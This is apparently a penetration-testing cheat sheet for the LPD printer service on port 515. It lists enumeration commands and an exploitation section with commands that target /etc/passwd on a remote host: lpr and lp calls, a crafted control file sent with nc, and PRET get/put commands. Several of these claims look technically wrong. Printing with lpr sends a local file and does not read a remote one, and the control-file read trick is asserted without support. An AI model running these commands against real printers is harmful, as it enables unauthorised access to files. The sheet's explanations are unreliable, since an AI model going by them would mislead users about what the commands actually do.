# Port 515 - LPD (Line Printer Daemon)

## Table of Contents
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
nmap -p 515 --script "lpd-info" $rhost && lpstat -h $rhost -a
```

### Nmap

```shell
nmap -sV -sC -p 515 $rhost
nmap -p 515 --script "lpd-info" $rhost
```

### List Printers

```shell
# Using lpstat
lpstat -h $rhost -a

# Using CUPS
lpinfo -h $rhost -v
```

---

## Exploitation

### Print File (Read Local Files)

```shell
# Using lpr to print remote file
lpr -H $rhost -P printer_name /etc/passwd

# Using lp
lp -d printer_name -h $rhost /etc/passwd
```

### LPD File Read Vulnerability

```shell
# Some LPD implementations allow reading files
# through the control file

# Create malicious control file
echo -e "H$lhost\nProot\nfdfA001$lhost\nUdfA001$lhost\nN/etc/passwd" > cf

# Send to LPD
cat cf | nc $rhost 515
```

### PRET - Printer Exploitation Toolkit

```shell
# Install PRET
git clone https://github.com/RUB-NDS/PRET.git
cd PRET

# Connect via LPD
python pret.py $rhost lpd

# Commands
ls
get /etc/passwd
put local.txt remote.txt
```

---

## Quick Reference

| Command | Description |
| :--- | :--- |
| `lpstat -h $rhost -a` | List printers |
| `lpr -H $rhost -P name file` | Print file |
| `nmap -p 515 --script "lpd-info" $rhost` | LPD enumeration |
